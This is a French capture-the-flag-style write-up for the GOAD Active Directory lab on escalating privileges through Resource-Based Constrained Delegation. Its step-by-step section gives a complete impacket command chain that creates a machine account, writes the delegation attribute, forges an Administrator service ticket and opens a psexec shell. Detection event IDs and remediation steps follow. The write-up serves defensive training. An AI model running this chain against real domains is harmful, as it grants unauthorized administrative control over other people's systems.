# Solution GOAD — RBCD : escalade par délégation contrainte basée sur les ressources

> Write-up d'amélioration GOAD (PROJECT.md §10). Escalade d'un compte standard vers admin local d'une
> cible via Resource-Based Constrained Delegation. Lab isolé uniquement.

## 1. Résumé
Si un attaquant peut **écrire** l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` d'une machine
cible (via une ACL GenericWrite/GenericAll, ou en créant un compte machine quand
`ms-DS-MachineAccountQuota > 0`), il configure une RBCD de **sa** machine vers la cible, puis utilise
**S4U2Self/S4U2Proxy** pour obtenir un ticket de service en tant que n'importe quel compte (ex.
Administrator) → accès administratif sur la cible.

## 2. Pré-requis (côté cible)
- Un des deux : droit d'écriture sur `msDS-AllowedToActOnBehalfOfOtherIdentity` de la cible, **ou**
  `ms-DS-MachineAccountQuota > 0` (défaut 10) + une ACL permettant l'écriture.
- Kerberos fonctionnel ; cible identifiée (BloodHound : edge GenericWrite/GenericAll).

## 3. Cause racine
- **ACL trop permissive** sur l'objet machine cible (module 21), et/ou **MachineAccountQuota** non nul
  permettant à tout utilisateur de créer un compte machine utilisable comme « identité déléguée ».

## 4. Exploitation pas-à-pas (lab isolé)
```bash
# 1) Compte machine contrôlé (si quota > 0)
impacket-addcomputer corp.meridian.com/user:'pass' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip 10.10.0.10
# 2) Écrire la RBCD sur la cible (nécessite GenericWrite/GenericAll sur TARGET$)
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.meridian.com/user:'pass' -dc-ip 10.10.0.10
# 3) S4U : ticket Administrator vers la cible
impacket-getST -spn cifs/target.corp.meridian.com -impersonate Administrator -dc-ip 10.10.0.10 'corp.meridian.com/EVIL$:Evil123!'
export KRB5CCNAME=Administrator.ccache
# 4) Accès admin
impacket-psexec -k -no-pass target.corp.meridian.com
```

## 5. Impact
Accès administratif sur la cible ; si la cible est un serveur sensible/DC, escalade vers le domaine.

## 6. Détection
| Étape | Signal | Source / ID |
|---|---|---|
| Création de compte machine | addcomputer | 4741 |
| Écriture RBCD | modif `msDS-AllowedToActOnBehalfOfOtherIdentity` | 5136 |
| S4U | tickets S4U2Self/Proxy | 4769 |

Règle Sigma : voir `02-modules/53-delegations-rbcd/defend.md`.

## 7. Remédiation
1. **`ms-DS-MachineAccountQuota = 0`** (empêche la création de comptes machine par les users).
2. **ACL propres** sur les objets machine (pas de GenericWrite/GenericAll pour des non-admins).
3. **Protected Users** / « sensitive, cannot be delegated » pour les comptes à risque.
4. Surveiller les écritures de l'attribut RBCD.

## 8. Validation (boucle purple team)
Après remédiation : re-tenter la chaîne → `addcomputer` échoue (quota 0) ou `rbcd write` échoue (ACL)
→ confirmer l'absence du 5136/4741 et l'échec du `getST`.

## 9. Pour aller plus loin
SpecterOps (RBCD), The Hacker Recipes. Modules liés : `21-ou-delegation`, `53-delegations-rbcd`,
`54-coercition-ntlm-relay`.
